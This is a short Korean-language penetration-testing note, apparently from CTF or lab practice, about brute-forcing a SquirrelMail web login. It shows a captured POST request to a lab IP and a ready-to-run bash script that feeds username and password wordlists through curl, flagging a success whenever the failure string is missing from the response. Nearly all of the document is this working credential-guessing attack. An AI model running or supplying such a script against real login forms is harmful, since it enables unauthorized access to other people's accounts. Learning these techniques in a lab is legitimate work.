# brute force

- curl -s -X POST로 웹 로그인 폼(SquirrelMail redirect.php 예시)에 users.txt·pass.txt를 이중 루프로 대입하고, 실패 응답의 고유 문자열을 grep -q로 판별해 성공 조합을 찾는 bash 브루트포스 스크립트
- Burp로 캡처한 POST 로그인 요청이 있는데 hydra 같은 도구가 폼 형식에 맞지 않을 때, POST 본문을 직접 제어하는 커스텀 무차별 대입이 필요한 시점
- POST URL·파라미터명·실패 판별용 고유 문자열을 실제 응답에서 미리 확인해야 하고, 사용자·비밀번호 워드리스트 파일이 준비돼 있어야 한다

> burpsuite

POST /squirrelmail/src/redirect.php HTTP/1.1
Host: 10.48.183.145
Content-Length: 81
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.48.183.145
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.48.183.145/squirrelmail/src/login.php
Accept-Encoding: gzip, deflate, br
Cookie: SQMSESSID=84i2hdlhrmmdbn3hnf7lc3h9v3
Connection: keep-alive

login_username=milesdyson&secretkey=1234&js_autodetect_results=1&just_logged_in=1

```bash
#!/bin/bash

# 사용자 및 비밀번호 파일
USER_FILE="users.txt"
PASS_FILE="pass.txt"

# --- 중요: 로그인 실패를 나타내는 고유 문자열을 여기에 입력하세요. ---
# (예: SquirrelMail의 경우, "Error logging in" 또는 "You have to be logged in to view this page." 등)
# 실제 응답을 확인하여 고유한 문자열을 사용해야 합니다.
FAILURE_STRING="로그인 실패 시 나오는 고유한 문자열" 
# ---------------------------------------------------------------

echo "--- SquirrelMail Brute-Force Test Started ---"
echo "Target: http://10.48.183.145/squirrelmail/src/redirect.php"
echo "-----------------------------------------------"

for u in $(cat $USER_FILE); do
  for p in $(cat $PASS_FILE); do
    
    # 테스팅 중인 조합 출력
    echo "Testing $u:$p"

    # curl 요청 실행
    # -s: Silent 모드 (진행률 표시 숨김)
    # -d: POST 데이터 전송 (application/x-www-form-urlencoded)
    # -q: grep 쿼리 옵션 (출력 없이 상태 코드만 반환)
    curl -s -X POST "http://10.48.183.145/squirrelmail/src/redirect.php" \
      -d "login_username=$u&secretkey=$p&js_autodetect_results=1&just_logged_in=1" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      | grep -q "$FAILURE_STRING"

    # grep의 Exit Code 확인
    # $? = 0 이면: 문자열을 찾았음 (로그인 실패) -> 아무것도 하지 않음
    # $? = 1 이면: 문자열을 찾지 못했음 (로그인 성공 또는 다른 응답) -> SUCCESS 메시지 출력
    if [ $? -ne 0 ]; then
        echo "✅ SUCCESS: $u:$p"
    fi
  done
done

echo "--- Test Completed ---"
```